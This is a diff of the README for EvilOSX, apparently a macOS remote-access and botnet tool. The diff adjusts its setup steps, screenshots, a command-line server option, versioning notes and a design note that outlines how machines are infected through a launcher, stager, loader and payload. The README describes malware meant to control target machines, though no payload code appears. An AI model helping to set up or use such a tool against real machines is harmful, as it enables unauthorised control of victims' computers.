@@ -53,9 +53,6 @@ $ sudo pip3 install -r requirements.txt
 # Go into the repository
 $ cd EvilOSX
 
-# Build a launcher to infect your target(s)
-$ python3 builder.py
-
 # Start listening for connections
 $ python3 start.py
 
@@ -64,7 +61,15 @@ $ python3 start.py
 **Because payloads are created unique to the target system (automatically by the server), the server must be running when any bot connects for the first time.**
 
 ## Screenshots
-![](https://i.imgur.com/BE24YPB.png)
+![](https://i.imgur.com/GHZD9br.png)
+![](https://i.imgur.com/qw3k4z4.png)
+
+##
+There's also a command line interface for those who want to use this over SSH:
+```bash
+$ python3 start.py --cli
+```
+
 ![](https://i.imgur.com/SpDPOUv.png)
 
 ## Motivation
@@ -101,14 +106,13 @@ Server and bot releases will be numbered with the follow format:
 ```
 
 And constructed with the following guidelines:
-- Breaking backward compatibility bumps the major
+- Breaking backward compatibility (with older bots) bumps the major
 - New additions without breaking backward compatibility bumps the minor
 - Bug fixes and misc changes bump the patch
 
 For more information on SemVer, please visit https://semver.org/.
 
 ## Design Notes
-- The server uses the [MVC](https://en.wikipedia.org/wiki/Model-view-controller) pattern
 - Infecting a machine is split up into three parts:
   * A **launcher** is run on the target machine whose only goal is to run the stager
   * The stager asks the server for a **loader** which handles how a payload will be loaded
